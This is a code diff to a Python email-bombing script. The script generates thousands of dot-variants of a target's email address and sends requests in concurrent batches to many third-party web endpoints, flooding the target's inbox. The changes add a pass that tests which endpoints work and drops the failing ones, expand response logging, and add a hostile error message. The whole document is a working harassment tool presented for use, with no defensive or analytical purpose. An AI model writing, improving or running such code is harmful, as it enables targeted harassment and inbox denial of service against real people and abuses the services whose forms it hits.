@@ -11,14 +11,14 @@ def generate_email_variants(email):
     variants = []
 
     for i in range(1, len(username)):
-        if len(variants) >= 9999:
+        if len(variants) >= 4999:
             break
         for combo in itertools.combinations(range(1, len(username)), i):
-            if len(variants) >= 9999:
+            if len(variants) >= 4999:
                 break
             variant = username
             for index in reversed(combo):
-                if len(variants) >= 9999:
+                if len(variants) >= 4999:
                     break
                 variant = variant[:index] + '.' + variant[index:]
             variants.append(variant)
@@ -66,7 +66,8 @@ def update_progress():
     if progress >= total:
         print("\r")
 
-status_codes = []
+status_codes = {}
+working = []
 
 async def fetch(session: aiohttp.ClientSession, sub: str, info, name: str = None):
     def fix(lol):
@@ -102,12 +103,19 @@ async def fetch(session: aiohttp.ClientSession, sub: str, info, name: str = None
             headers=headers,
             cookies=cookies
         ) as resp:
-            if threads == 1:
-                status = resp.status
-                evaluation = "FAILURE" if status >= 400 else "SUCCESS"
-                resp = await resp.text()
-                resp = resp.strip().replace("\n", "").replace("\r", "").replace("\t", "")[:150]
-                status_codes.append(f"{name or 'Unknown'} -- {method} -- {status} -- {evaluation}\nURL: {url}\nRESPONSE: {resp}")
+            status = resp.status
+            evaluation = "FAILURE" if status >= 400 else "SUCCESS"
+            resp = await resp.text()
+            resp = resp.strip().replace("\n", "").replace("\r", "").replace("\t", "")[:1000]
+            #status_codes.append(f"{name or 'Unknown'} -- {method} -- {status} -- {evaluation}\nURL: {url}\nRESPONSE: {resp}")
+            if status_codes.get(name) is None:
+                status_codes[name] = {
+                    "method": method,
+                    "status": status,
+                    "evaluation": evaluation,
+                    "url": url,
+                    "resp": resp
+                }
     except Exception:
         pass
     update_progress()
@@ -149,7 +157,7 @@ async def main():
             email = input("type cute email address here: ").strip().lower()
             if validate_email(email):
                 break
-            print("🤬 invalid email")
+            print("invalid email fuck you!!!!")
 
         variants = generate_email_variants(email)
         threads = None
@@ -177,11 +185,26 @@ async def main():
         }
         print("\n".join([f"{k.upper()}: {v}" for k, v in info.items()]))
         divide()
-        if threads == 1:
-            lol = input("debug mode is active, type Y to only test the last function ").strip().lower()
-            if lol == "y":
+        debug = threads == 1
+        if debug:
+            testlast = input("debug mode is active, type Y to only test the last function ").strip().lower() == "y"
+            if testlast:
                 total = 1
                 functions = dict([next(reversed(functions.items()))])
+        else:
+            print("testing endpoints to grant you a few extra minutes of your life...")
+            test_tasks = [asyncio.create_task(fetch(session, email, values, name)) for name, values in functions.items()]
+            total = len(test_tasks)
+            for j in range(0, len(test_tasks), size):
+                await asyncio.gather(*test_tasks[j:j+size])
+                await asyncio.sleep(1)
+            working = [k for k, v in status_codes.items() if v.get("status") < 400]
+            print(f"{len(working)} of {len(test_tasks)} are working")
+            functions = {k: v for k, v in functions.items() if k in working}
+            variants = variants[1:]
+            print(f"{len(test_tasks):,} endpoints have been tested -- {round((len(functions)/len(test_tasks))*100, 1):.1f}% success rate")
+            total = len(functions) * len(variants)
+            progress = 0
         print(f"😼 sending some cute emails :3")
         print("🔋 initializing...", end="\r")
         start = time.time()
@@ -189,9 +212,9 @@ async def main():
         for j in range(0, len(tasks), size):
             await asyncio.gather(*tasks[j:j+size])
             await asyncio.sleep(1)
-    if threads == 1:
+    if debug:
         with open("results.txt", "w", encoding="utf-8") as file:
-            file.write("\n\n".join(status_codes))
+            file.write("\n\n".join([(f"{name or 'Unknown'} -- {values['method']} -- {values['status']} -- {values['evaluation']}\nURL: {values['url']}\nRESPONSE: {values['resp']}") for name, values in status_codes.items()]))
     print(f"🤣 attempted to send {total:,} emails in {round(time.time() - start, 3):.3f} seconds")
     print("😤 keep in mind that some emails can be delayed or never arrive")
     print("👋 have a nice day ^_^")
